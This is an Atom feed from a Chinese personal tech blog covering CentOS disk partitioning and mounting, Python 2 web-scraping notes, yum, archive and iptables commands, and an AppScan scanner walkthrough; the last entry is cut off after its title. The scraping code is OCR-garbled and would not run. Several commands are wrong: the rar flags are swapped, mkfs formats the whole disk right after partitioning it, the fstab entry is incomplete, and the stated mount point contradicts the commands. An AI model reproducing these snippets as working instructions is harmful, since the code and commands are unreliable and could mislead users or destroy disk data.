<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Secer</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-08-26T14:57:37.988Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>shiqian</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>centos7初始化硬盘分区、挂载</title>
    <link href="http://yoursite.com/2018/08/26/%E2%80%9Ccentos7-%E5%88%9D%E5%A7%8B%E5%8C%96%E7%A1%AC%E7%9B%98%E5%88%86%E5%8C%BA%E3%80%81%E6%8C%82%E8%BD%BD/"/>
    <id>http://yoursite.com/2018/08/26/“centos7-初始化硬盘分区、挂载/</id>
    <published>2018-08-26T13:30:05.000Z</published>
    <updated>2018-08-26T14:57:37.988Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-135.png" alt="upload successful"></p><h2 id="linux硬盘知识："><a href="#linux硬盘知识：" class="headerlink" title="linux硬盘知识："></a>linux硬盘知识：</h2><p>linux下硬盘设备名为（IDE硬盘为hdx（x为从a—d）因为IDE硬盘最多四个，SCSI，SATA，USB硬盘为sdx（x为a—z）），硬盘主分区最多为4个.所以主分区从sdb1开始到sdb4，其中sdb4为扩展分区，逻辑分区从sdb5开始，（逻辑分区永远从sdb5开始…）设备名可以使用fdisk –l查看</p><h2 id="开始分区"><a href="#开始分区" class="headerlink" title="开始分区"></a>开始分区</h2><h4 id="1-查看新增磁盘信息"><a href="#1-查看新增磁盘信息" class="headerlink" title="1.查看新增磁盘信息"></a>1.查看新增磁盘信息</h4><p> <code>lsblk</code></p><p><img src="\images\pasted-137.png" alt="upload successful"></p><h4 id="2-查看分区信息"><a href="#2-查看分区信息" class="headerlink" title="2.查看分区信息"></a>2.查看分区信息</h4><p><code>fdisk -l</code></p><p><img src="\images\pasted-138.png" alt="upload successful"></p><h4 id="3-将sdb分区，键入m获取帮助"><a href="#3-将sdb分区，键入m获取帮助" class="headerlink" title="3.将sdb分区，键入m获取帮助"></a>3.将sdb分区，键入m获取帮助</h4><p><img src="\images\pasted-139.png" alt="upload successful"></p><h4 id="4-键入n添加新的分区"><a href="#4-键入n添加新的分区" class="headerlink" title="4.键入n添加新的分区"></a>4.键入n添加新的分区</h4><p>p表示主分区，e表示扩展分区</p><p><img src="\images\pasted-140.png" alt="upload successful"></p><h4 id="5-创建主分区"><a href="#5-创建主分区" class="headerlink" title="5.创建主分区"></a>5.创建主分区</h4><p><img src="\images\pasted-141.png" alt="upload successful"><br>第一条红框处按回车就好了，第二条红框处，我想设2G的一个空间，键入+2G</p><p>继续设置第二个主分区大小2G，第三个主分区大小3G</p><p><img src="\images\pasted-142.png" alt="upload successful"></p><h4 id="6-创建扩展分区"><a href="#6-创建扩展分区" class="headerlink" title="6.创建扩展分区"></a>6.创建扩展分区</h4><p>创建第四个分区为扩展分区</p><p><img src="\images\pasted-143.png" alt="upload successful"></p><h4 id="7-创建逻辑分区"><a href="#7-创建逻辑分区" class="headerlink" title="7.创建逻辑分区"></a>7.创建逻辑分区</h4><p>创建第五个分区为逻辑分区</p><p><img src="\images\pasted-144.png" alt="upload successful"><br>完成后一定要w进行写入磁盘并退出，否则上面的操作将白费</p><p><img src="\images\pasted-145.png" alt="upload successful"></p><h2 id="对分区操作"><a href="#对分区操作" class="headerlink" title="对分区操作"></a>对分区操作</h2><h4 id="1-查看分区情况"><a href="#1-查看分区情况" class="headerlink" title="1.查看分区情况"></a>1.查看分区情况</h4><p><img src="\images\pasted-146.png" alt="upload successful"></p><h4 id="2-删除分区"><a href="#2-删除分区" class="headerlink" title="2.删除分区"></a>2.删除分区</h4><p>删除分区5即逻辑分区</p><p><img src="\images\pasted-147.png" alt="upload successful"></p><h4 id="3-格式化分区"><a href="#3-格式化分区" class="headerlink" title="3.格式化分区"></a>3.格式化分区</h4><p>首先查看文件类型  df -hT<br><code>mkfs -t ext4 /dev/sdb</code></p><p><img src="\images\pasted-148.png" alt="upload successful"></p><h2 id="挂载磁盘"><a href="#挂载磁盘" class="headerlink" title="挂载磁盘"></a>挂载磁盘</h2><h4 id="临时挂载"><a href="#临时挂载" class="headerlink" title="临时挂载"></a>临时挂载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /data/gz</span><br><span class="line">mount /dev/sdb /data/gz</span><br><span class="line">df -hT</span><br></pre></td></tr></table></figure><p><img src="\images\pasted-150.png" alt="upload successful"><br>取消挂载就是umount<br>这种方式只临时挂载到/opt目录下，下次开机时不会自动挂载<br>注意：挂载后/opt目录下的文件会被临时删除，注意备份</p><h4 id="开机自动挂载"><a href="#开机自动挂载" class="headerlink" title="开机自动挂载"></a>开机自动挂载</h4><p>1.查询磁盘分区的UUID    <code>blkid /dev/sdb</code></p><p><img src="\images\pasted-149.png" alt="upload successful"></p><p>2.通过vim编辑<code>vim /etc/fstab/</code><br><code>UUID=870d929c-dbce-40c8-9e9e-f1933a6f422c /data/gz ext4</code><br>保存<br>3.重启，查看 <code>df-hT</code></p><p><img src="\images\pasted-151.png" alt="upload successful"><br>自动挂载成功</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="运维" scheme="http://yoursite.com/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="运维" scheme="http://yoursite.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>用python写网络爬虫</title>
    <link href="http://yoursite.com/2018/08/26/%E7%94%A8python%E5%86%99%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    <id>http://yoursite.com/2018/08/26/用python写网络爬虫/</id>
    <published>2018-08-26T06:32:29.000Z</published>
    <updated>2018-08-26T13:42:24.503Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="第一章-网络爬虫简介"><a href="#第一章-网络爬虫简介" class="headerlink" title="第一章-网络爬虫简介"></a>第一章-网络爬虫简介</h1><h4 id="爬虫是否合法"><a href="#爬虫是否合法" class="headerlink" title="爬虫是否合法"></a>爬虫是否合法</h4><p>当抓 取的数据是现实生活中的真实数据（比如，营业地址、 电话清 单） 时， 是允许转载的。 但是， 如果是原创数据 （比如， 意见和评论）， 通常就会受到版权限制， 而不能转载</p><h4 id="爬虫的便利"><a href="#爬虫的便利" class="headerlink" title="爬虫的便利"></a>爬虫的便利</h4><p>重复的手工可以用爬虫的自动化实现</p><h4 id="检查robots-txt"><a href="#检查robots-txt" class="headerlink" title="检查robots.txt"></a>检查robots.txt</h4><p>大多数网站 都会定义robots.txt文件， 这样可以让爬虫了解爬取该网站时存在哪些限制</p><h4 id="检查网站地图"><a href="#检查网站地图" class="headerlink" title="检查网站地图"></a>检查网站地图</h4><p>网站提供的Sitemap 文件 （即网 站 地图） 可以帮助爬虫定位网 站 最新的内 容，而无须爬 取每 一 个网页</p><h4 id="估算网站大小"><a href="#估算网站大小" class="headerlink" title="估算网站大小"></a>估算网站大小</h4><p>我们可以通过Goo gle搜索 的s ite 关键词过滤域名结果， 从而获取该 信息。 我们可以从 htt p: //www. google.<br>com/adva口ced search 了解到该 接口及其他高级搜索 参数的用法。</p><p>使用site 关键词对示例网 站 进行 搜索 的结果， 即在Goo g le中 搜索 s ite: exam ple. webscra ping. com</p><h4 id="识别网站所用技术"><a href="#识别网站所用技术" class="headerlink" title="识别网站所用技术"></a>识别网站所用技术</h4><p>builtwith 模块。 该模块的安装方法如下：</p><p>pip   install  builtwith</p><p>如何使用：</p><p>import builtwith</p><p>builtwith . parse （ ’ http : / /exaple . webscraping . com ’ ｝</p><h4 id="寻找网站所有者"><a href="#寻找网站所有者" class="headerlink" title="寻找网站所有者"></a>寻找网站所有者</h4><p>我们可以使用WHOIS协议查询域名的注册者是谁. Pyton中有一个针对该协议的封装库，其文档地址为 https: // pypi. python.org/ pypi/ python-whois ， 我们可以通过 pip进行安装。</p><p>pip install python-whois</p><p>import  whois</p><p>print  whois . whois (‘appspt . com’)</p><h4 id="编写第一个网络爬虫"><a href="#编写第一个网络爬虫" class="headerlink" title="编写第一个网络爬虫"></a>编写第一个网络爬虫</h4><h5 id="下载网页"><a href="#下载网页" class="headerlink" title="下载网页"></a>下载网页</h5><p>使用Python的urllib 2 模块下载URL。</p><p>import   urllib2<br>def   download (url ) :<br>            return   urllib2.url .open ( url ).read ( )</p><h5 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h5><p>import  urllib2</p><p>def  download(url):</p><pre><code>print &apos;downloading......&apos;,urltry:     html = urllib2.urlopen(url).read()except  urllib2.URLError as  e:     print  &apos;download  error:&apos; , e\.reason     html = nonereturn html</code></pre><p>当出现下载错误时， 该函数能够捕获到异常， 然后返回 None</p><h5 id="重试下载"><a href="#重试下载" class="headerlink" title="重试下载"></a>重试下载</h5><p>4xx错误发生在请求存在问题时，而5xx 错误则发生在服务端存在问题时。 所以,我们只需要确保download函数在发生5xx错误时重试下载即可</p><p>import  urllib2</p><p>def  download(url , num_retries = 2 ):</p><pre><code>print &apos;downloading......&apos;,urltry:     html = urllib2.urlopen(url).read()except  urllib2.URLError as  e:     print  &apos;download  error:&apos; , e\.reason     html = none     if   num_retries &gt; 0:           if   hasattr ( e ， ’ code ’ ） and  500 &lt;=  e . code &lt; 600:           return  download ( url , num_retries - 1 ) return   html</code></pre><h5 id="用户代理"><a href="#用户代理" class="headerlink" title="用户代理"></a>用户代理</h5><p>为避免网站有反爬技术，我们需要加上请求头以模仿浏览器请求</p><p>import  urllib2</p><p>def  download(url , num_retries = 2 ):</p><pre><code>print &apos;downloading......&apos;,url headers={&apos;user-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;} request = urllib2 . Request ( url , headers =headers )try:     html = urllib2.urlopen(request).read()except  urllib2.URLError as  e:     print  &apos;download  error:&apos; , e\.reason     html = none     if   num_retries &gt; 0:           if   hasattr ( e ， ’ code ’ ） and  500 &lt;=  e . code &lt; 600:           return  download ( url , num_retries - 1 ) return   html</code></pre><h1 id="第二章-数据抓取"><a href="#第二章-数据抓取" class="headerlink" title="第二章-数据抓取"></a>第二章-数据抓取</h1><h3 id="三种网页抓取方法"><a href="#三种网页抓取方法" class="headerlink" title="三种网页抓取方法"></a>三种网页抓取方法</h3><p>首先是正则表达式 ， 然后是流行的BeautifulSoup 模块 ， 最后是强大的lxml模块</p><p>示例网站为：<a href="http://example.webscraping.com" target="_blank" rel="noopener">http://example.webscraping.com</a></p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>当我们使用正则表达式抓取面积数据 时 ， 首 先需要尝试匹配＜td&gt;元素中的内容 ， 如下所 示</p><p>import re</p><p>url ＝ ‘<a href="http://example" target="_blank" rel="noopener">http://example</a> . webscraping.com/places/view/United Kingdom239’</p><p>html = download (url )</p><p>re.findall （ ’＜ td class＝”w2p fw ” ＞ ( . * ? ) &lt;/td＞ ’ ， html )</p><p>从上述结果 中 可 以看 出 ， 多个国 家属性都使用 了＜td c l a s s = “ w2p fw “ &gt;标签 。 要想分离出 面积属性 ，我们可以只选择其中的第二个元素</p><p>re .findall （ ’ ＜td c l a s s ＝ ” w2p fw ” ＞ （.*?） ＜ ／ td＞ ’ ， html ) [ 1 ]</p><p>虽然现在可以使用 这个方案 ， 但是如果网页发生变化 ， 该方案很可能就会失效</p><h4 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h4><p>Beautiful Soup 是一个非常流行 的 Pyhon 模块 。 该模块可以解析网 页 ， 并提供定位内容的便捷接口 。 如果你还没有安装该模块 ， 可 以使用下面的命令安装其最新版本 ：</p><p>pip install   beautifulsoup4</p><p>使用 Beautifl Soup 的第一步是将 己下 载 的 HTML 内 容解析为 soup 文档</p><p>from bs4 import  BeautifulSoup</p><p> html ＝ ’ ＜u l c l a s s =country&gt;&lt; l i &gt;Area&lt; l i &gt; Population&lt; /ul＞ ’</p><p>soup = BeautifulSoup （html ， ’ html .parser’ ）</p><p>BeautifulSoup 能够正确解析缺失 的引号并闭合标签, 现在可 以使用find()和find_all()方法来定位需要的元素了</p><p>u l = soup.find（ ’ ul ’ ， attrs＝ ｛ ’ class ’ ： ’ country ’ ｝ ）</p><p>ul.find（’ l i ’）  # 只匹配第一个符合的</p><p>ul.find_all（’ l i ’）  # 匹配所有符合的</p><p>使用该方法抽取示例国家面积数据的完整代码 </p><p>from bs4 import Beautiful Soup<br> url ＝ ‘<a href="http://example" target="_blank" rel="noopener">http://example</a> . webscraping.com/places/view/United Kingdom239’<br> html = download (url )<br>soup = Beautifulsoup(html)</p><p> tr = soup.find ( attrs＝｛ ‘id’: ‘places_area_row ’｝）<br> td = tr.find (attrs ＝ ｛ ’ cl a s s ’ ： ’ w2p_fw ’))      # locate the area tag<br> area = td.text                            # extract the text from this tag<br> print area<br>244,82 0 quare kilometres</p><h4 id="Lxml"><a href="#Lxml" class="headerlink" title="Lxml"></a>Lxml</h4><p>Lxml 是基于libxml 2这一 XML 解析库的Python封装 。 该模块使用C语言编写 ， 解析速度比Beautifl Soup更快，不过安装过程也更为复杂</p><p>和 Beautifl Soup 一样 ， 使用 lxml 模块 的第一步也是将有可能不合法 的HTML 解析为 统一格式,同样地, lxml 也可以正确解析属性两侧缺失的引号,并闭合标签</p><p>解析完输入 内 容之后 ， 进入选择元素 的步骤 ， 此 时 l xml 有几种不 同 的方法 ， 比如 XPath 选择器和Beautifl Soup 的find()方法.  我们将会使用 css 选择器 ， 因 为它更加 简 沽</p><p>使用lxml 的 css 选择器抽取面积数据 的 示例</p><p>import   lxml.html</p><p>tree = lxml.html.fromstring(html )</p><p>td = tree.cssselect ( ’ tr#places_area_r。w &gt; td . w2p_fw ’) [0]</p><p>area = td.text content()</p><p>print area</p><p>这段代码首先会找 到 ID 为place s area row 的表格行元素 ， 然后选择class为 w2pfw 的表格数据子标签</p><h5 id="css-选择器"><a href="#css-选择器" class="headerlink" title="css 选择器"></a>css 选择器</h5><p>css 选择器表示选择元素所使用的模式</p><p>选择所 有标签 ： ＊<br>选择＜a＞标 签： a<br>选择所有 cla s s ＝ ”lin k ” 的 元 素 ： .lin k<br>选择 cla s s ＝ ”link ” 的 ＜a＞标 签： a.link<br>选择 id= “ home ” 的 ＜a＞标 签： a #home<br>选择父 元 素 为 ＜a＞标 签 的 所 有 ＜ span＞子标 签： a &gt; span<br>选择＜a＞标签 内 部 的 所 有 &lt; span＞标签： a  span<br>选择 title 属 性 为 ” Home ” 的 所 有＜a＞标 签： a [ title=Home ]</p><p>lxml在内部实现 中 ， 实 际 是将 css 选择器转换为等价的 XPath 选择器</p><h4 id="性能对比"><a href="#性能对比" class="headerlink" title="性能对比"></a>性能对比</h4><p>每种抓取方法 的优缺点:</p><p>抓取方法                    性能          使用难度               安装难度<br>正则表达式                  快              困难                     简单 （ 内 置模块 ）<br>Beautifl Soup             慢              简单                      简单 （ 纯 P归hon )<br>Lxml                            快              简单                      相对困难</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>运维知识</title>
    <link href="http://yoursite.com/2018/08/25/%E8%BF%90%E7%BB%B4%E7%9F%A5%E8%AF%86/"/>
    <id>http://yoursite.com/2018/08/25/运维知识/</id>
    <published>2018-08-25T14:39:05.000Z</published>
    <updated>2018-08-25T15:06:11.791Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h2 id="配置本地yum源"><a href="#配置本地yum源" class="headerlink" title="配置本地yum源"></a>配置本地yum源</h2><p>vim /etc/yum.repos.d/rhel7.repo</p><p>[rhel7]</p><p>name=rhel7</p><p>baseurl=file:///media/cdrom</p><p>enabled=1</p><p>gpgcheck=0</p><p>创建挂载点进行挂载，设置开机自动挂载。</p><p>mkdir -p /media/cdrom</p><p>mount /dev/cdrom /media/cdrom</p><p>挂载本地iso文件</p><p> 1.上传iso文件到/opt  </p><p>2.创建挂载目录</p><p>mkdir /media/CentOS7</p><p>3.挂载iso文件</p><p>mount -t iso9660 -o loop /opt/CentOS-7-x86_64-DVD-1511_7.2.iso /media/CentOS7/</p><p>4.配置源</p><p>执行 vi /etc/yum.repos.d/CentOS7-Localsource.repo #打开repo文件，如果这一文件不存在则被创建<br>按a 进入编辑模式<br>输入以下内容：<br>[CentOS7-Localsource]<br>name=CentOS7<br>baseurl=file:///media/CentOS7<br>enabled=1<br>gpgcheck=0</p><p>按ESC退出编辑 输入 :x 再回车 保存后退出</p><p>5.将此文件/etc/yum.repos.d/CentOS-Base.repo备份掉，或者移动到别的目录下</p><p>6.生成本地yum缓存 执行</p><p>yum  clean all(清除缓存)</p><p>yum makecache(建立新缓存)</p><p>7.测试是否生效</p><p>yum install telnet</p><p>8.卸载挂载的镜像文件</p><p>umount  /media/CentOS7</p><h2 id="Linux下打包和解压缩"><a href="#Linux下打包和解压缩" class="headerlink" title="Linux下打包和解压缩"></a>Linux下打包和解压缩</h2><h4 id="各种解压缩命令"><a href="#各种解压缩命令" class="headerlink" title="各种解压缩命令"></a>各种解压缩命令</h4><p>.tar<br>压缩：tar cvf FileName.tar FileName</p><p>解压：tar xvf FileName.tar</p><p>.gz<br>解压1：gunzip FileName.gz<br>解压2：gzip -d FileName.gz<br>压缩：gzip FileName </p><p>.tar.gz<br>解压：tar zxvf FileName.tar.gz </p><p>压缩：tar zcvf FileName.tar.gz DirName </p><p>.bz2<br>解压1：bzip2 -d FileName.bz2<br>解压2：bunzip2 FileName.bz2<br>压缩： bzip2 -z FileName </p><p>.tar.bz2<br>解压：tar jxvf FileName.tar.bz2 </p><p>压缩：tar jcvf FileName.tar.bz2 DirName </p><p>.bz<br>解压1：bzip2 -d FileName.bz<br>解压2：bunzip2 FileName.bz<br>压缩：未知 </p><p>.tar.bz<br>解压：tar jxvf FileName.tar.bz </p><p>压缩：未知 </p><p>.Z<br>解压：uncompress FileName.Z<br>压缩：compress FileName </p><p>.tar.Z<br>解压：tar Zxvf FileName.tar.Z </p><p>压缩：tar Zcvf FileName.tar.Z DirName </p><p>.tgz<br>解压：tar zxvf FileName.tgz<br>压缩：未知 </p><p>.tar.tgz<br>解压：tar zxvf FileName.tar.tgz </p><p>压缩：tar zcvf FileName.tar.tgz FileName </p><p>.zip<br>解压：unzip FileName.zip </p><p>压缩：zip FileName.zip DirName </p><p>.rar<br>解压：rar a FileName.rar<br>压缩：rar e FileName.rar </p><h4 id="不同后缀的含义："><a href="#不同后缀的含义：" class="headerlink" title="不同后缀的含义："></a>不同后缀的含义：</h4><pre><code>.tar打包格式：tar程序打包的数据，并没有压缩过.z格式：compress程序压缩的文件.gz压缩格式：gzip程序压缩的文件 .bz2压缩格式：bzip2程序压缩的文件.tar.gz打包压缩：tar程序打包的文件，其中并且经过 gzip 的压缩.tar.bz2打包压缩：tar程序打包的文件，其中并且经过 bzip2 的压缩</code></pre><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>CentOS7默认的防火墙不是iptables,而是firewalld.<br>安装iptable iptable-service</p><h5 id="先检查是否安装了iptables"><a href="#先检查是否安装了iptables" class="headerlink" title="#先检查是否安装了iptables"></a>#先检查是否安装了iptables</h5><p>service iptables status</p><p>#安装iptables<br>yum install -y iptables</p><p>#升级iptables<br>yum update iptables </p><p>#安装iptables-services<br>yum install iptables-services</p><h5 id="禁用-停止自带的firewalld服务"><a href="#禁用-停止自带的firewalld服务" class="headerlink" title="禁用/停止自带的firewalld服务"></a>禁用/停止自带的firewalld服务</h5><p>#停止firewalld服务<br>systemctl stop firewalld</p><p>#禁用firewalld服务<br>systemctl mask firewalld<br>设置现有规则</p><h5 id="查看iptables现有规则"><a href="#查看iptables现有规则" class="headerlink" title="#查看iptables现有规则"></a>#查看iptables现有规则</h5><p>iptables -L -n</p><p>#先允许所有,不然有可能会杯具<br>iptables -P INPUT ACCEPT</p><p>#清空所有默认规则<br>iptables -F</p><p>#清空所有自定义规则<br>iptables -X</p><p>#所有计数器归0<br>iptables -Z</p><p>#允许来自于lo接口的数据包(本地访问)<br>iptables -A INPUT -i lo -j ACCEPT</p><h5 id="开放22端口"><a href="#开放22端口" class="headerlink" title="#开放22端口"></a>#开放22端口</h5><p>iptables -A INPUT -p tcp –dport 22 -j ACCEPT</p><p>#开放21端口(FTP)<br>iptables -A INPUT -p tcp –dport 21 -j ACCEPT</p><p>#开放80端口(HTTP)<br>iptables -A INPUT -p tcp –dport 80 -j ACCEPT</p><p>#开放443端口(HTTPS)<br>iptables -A INPUT -p tcp –dport 443 -j ACCEPT</p><p>#允许ping<br>iptables -A INPUT -p icmp –icmp-type 8 -j ACCEPT</p><p>#允许接受本机请求之后的返回数据 RELATED,是为FTP设置的<br>iptables -A INPUT -m state –state  RELATED,ESTABLISHED -j ACCEPT</p><p>#其他入站一律丢弃<br>iptables -P INPUT DROP</p><p>#所有出站一律绿灯<br>iptables -P OUTPUT ACCEPT</p><p>#所有转发一律丢弃<br>iptables -P FORWARD DROP</p><h5 id="其他规则设定"><a href="#其他规则设定" class="headerlink" title="其他规则设定"></a>其他规则设定</h5><p>#如果要添加内网ip信任（接受其所有TCP请求）<br>iptables -A INPUT -p tcp -s 45.96.174.68 -j ACCEPT</p><p>#过滤所有非以上规则的请求<br>iptables -P INPUT DROP</p><p>#要封停一个IP，使用下面这条命令：<br>iptables -I INPUT -s <strong><em>.</em></strong>.<strong><em>.</em></strong> -j DROP</p><p>#要解封一个IP，使用下面这条命令:<br>iptables -D INPUT -s <strong><em>.</em></strong>.<strong><em>.</em></strong> -j DROP</p><h5 id="保存规则设定"><a href="#保存规则设定" class="headerlink" title="保存规则设定"></a>保存规则设定</h5><p>#保存上述规则<br>service iptables save<br>开启iptables服务 </p><p>##### </p><h5 id="注册iptables服务"><a href="#注册iptables服务" class="headerlink" title="#注册iptables服务"></a>#注册iptables服务</h5><p>#相当于以前的chkconfig iptables on<br>systemctl enable iptables.service</p><p>#开启服务<br>systemctl start iptables.service</p><p>#查看状态<br>systemctl status iptables.service</p><p>解决vsftpd在iptables开启后,无法使用被动模式的问题<br>1.首先在/etc/sysconfig/iptables-config中修改或者添加以下内容</p><p>#添加以下内容,注意顺序不能调换<br>IPTABLES_MODULES=”ip_conntrack_ftp”<br>IPTABLES_MODULES=”ip_nat_ftp”<br>2.重新设置iptables设置<br>iptables -A INPUT -m state –state  RELATED,ESTABLISHED -j ACCEPT</p><h5 id="以下为完整设置脚本"><a href="#以下为完整设置脚本" class="headerlink" title="以下为完整设置脚本"></a>以下为完整设置脚本</h5><p>#!/bin/sh<br>iptables -P INPUT ACCEPT<br>iptables -F<br>iptables -X<br>iptables -Z<br>iptables -A INPUT -i lo -j ACCEPT<br>iptables -A INPUT -p tcp –dport 22 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 21 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 80 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 443 -j ACCEPT<br>iptables -A INPUT -p icmp –icmp-type 8 -j ACCEPT<br>iptables -A INPUT -m state –state RELATED,ESTABLISHED -j ACCEPT<br>iptables -P INPUT DROP<br>iptables -P OUTPUT ACCEPT<br>iptables -P FORWARD DROP<br>service iptables save<br>systemctl restart iptables.service</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="运维" scheme="http://yoursite.com/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="运维" scheme="http://yoursite.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Appscan使用指北</title>
    <link href="http://yoursite.com/2018/08/23/Appscan%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/"/>
    <id>http://yoursite.com/2018/08/23/Appscan使用指北/</id>
    <published>2018-08-23T13:45:05.000Z</published>
    <updated>2018-08-23T15:18:31.684Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-115.png" alt="upload successful"></p><h2 id="关于Appscan"><a href="#关于Appscan" class="headerlink" title="关于Appscan"></a>关于Appscan</h2><p>Rational AppScan（简称 AppScan）其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的 AppScan  source edition，到针对 Web 应用进行快速扫描的 AppScan    standard edition，以及进行安全管理和汇总整合的 AppScan     enterprise Edition 等。我们经常说的 AppScan 就是指的桌面版本的AppScan，即 AppScan standard edition。其安装在Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试</p><h2 id="AppScan工作原理"><a href="#AppScan工作原理" class="headerlink" title="AppScan工作原理"></a>AppScan工作原理</h2><p><img src="\images\pasted-117.png" alt="upload successful"></p><p>1.通过搜索（爬行）发现整个 Web 应用结构</p><p>2.根据分析，发送修改的 HTTP Request 进行攻击尝试（扫描规则库）</p><p>3.通过对于 Respone 的分析验证是否存在安全漏洞</p><h4 id="扫描原理"><a href="#扫描原理" class="headerlink" title="扫描原理"></a>扫描原理</h4><p>扫描规则库 + 爬行 + 测试</p><p><img src="\images\pasted-116.png" alt="upload successful"></p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h4 id="常规扫描"><a href="#常规扫描" class="headerlink" title="常规扫描"></a>常规扫描</h4><p>下一步——下一步。。</p><p>1.打开 AppScan.exe 选择 文件</p><p>2.选择常规扫描（扫描规则自己可以定义后面详细说明）下一步</p><p><img src="\images\pasted-119.png" alt="upload successful"></p><p>3.输入你要扫描的起始 url，然后下一步</p><h4 id="登录扫描"><a href="#登录扫描" class="headerlink" title="登录扫描"></a>登录扫描</h4><p>如果选择记录此项后,会出现一个新的浏览器，并尝试链接到指定的网站作为本扫描的起始 URL.你需要输入账号和密码登陆到应用程序.这样设置之后你可以关闭浏览器，但是不要点击注销按钮.</p><p>更改浏览器：Tools–&gt;Options –&gt;Advanced  OpenIEBrower 的值 0–Appscan浏览器,1–IE,2–Firefox,3–Chrome.<br>如果选择提示，每次注销之后,Appscan 会提示你登陆到应用程序中.如果你打算整个扫描你的系统，你可以选择这个选项</p><p><img src="\images\pasted-118.png" alt="upload successful"><br>如果遇到没有验证码的登录页面可以选择自动选择下一步</p><h4 id="测试策略"><a href="#测试策略" class="headerlink" title="测试策略"></a>测试策略</h4><p>根据你的测试策略,你需要选择最适合你需求的策略,现有的策略都是默认（缺省）的</p><p><img src="\images\pasted-120.png" alt="upload successful"><br>这是开始扫描的最后一步.IBM Rational Appscan 允许你选择你想要的扫描方式，即完成扫描,探索扫描等</p><p><img src="\images\pasted-121.png" alt="upload successful"></p><h2 id="AppScan-简单配置"><a href="#AppScan-简单配置" class="headerlink" title="AppScan-简单配置"></a>AppScan-简单配置</h2><h4 id="配置面板"><a href="#配置面板" class="headerlink" title="配置面板"></a>配置面板</h4><p>点击 appscan 的配置选项即可打开配置面板，里面的参数可以根据自己实际情况修改</p><p><img src="\images\pasted-122.png" alt="upload successful"></p><h4 id="排除文件路径"><a href="#排除文件路径" class="headerlink" title="排除文件路径"></a>排除文件路径</h4><p><img src="\images\pasted-123.png" alt="upload successful"></p><h4 id="探索选项"><a href="#探索选项" class="headerlink" title="探索选项"></a>探索选项</h4><p><img src="\images\pasted-124.png" alt="upload successful"></p><h4 id="错误页面"><a href="#错误页面" class="headerlink" title="错误页面"></a>错误页面</h4><p><img src="\images\pasted-125.png" alt="upload successful"></p><h4 id="扫描策略"><a href="#扫描策略" class="headerlink" title="扫描策略"></a>扫描策略</h4><p>可以根据网站条件修改 为加快网站扫描速度 可以去掉不重要的漏洞扫描</p><h4 id="配置总结"><a href="#配置总结" class="headerlink" title="配置总结"></a>配置总结</h4><p>对于大型的网站，我们可以从几个方面来优化配置：</p><p>1.选择合适的，最小化的扫描规则</p><p>2.分解扫描任务，把一个大的扫描任务分解为多个小的扫描任务</p><p>3.根据页面特点，设置可以过滤的类似页面（冗余页面）</p><h2 id="扩展工具"><a href="#扩展工具" class="headerlink" title="扩展工具"></a>扩展工具</h2><p><img src="\images\pasted-126.png" alt="upload successful"></p><p>表单破解</p><p><img src="\images\pasted-127.png" alt="upload successful"><br>链接测试</p><p><img src="\images\pasted-128.png" alt="upload successful"><br>编码转换</p><p><img src="\images\pasted-129.png" alt="upload successful"><br>正则测试、</p><p><img src="\images\pasted-130.png" alt="upload successful"><br>发包测试</p><p><img src="\images\pasted-131.png" alt="upload successful"><br>会话令牌分析</p><p><img src="\images\pasted-132.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>应急响应手工杀马</title>
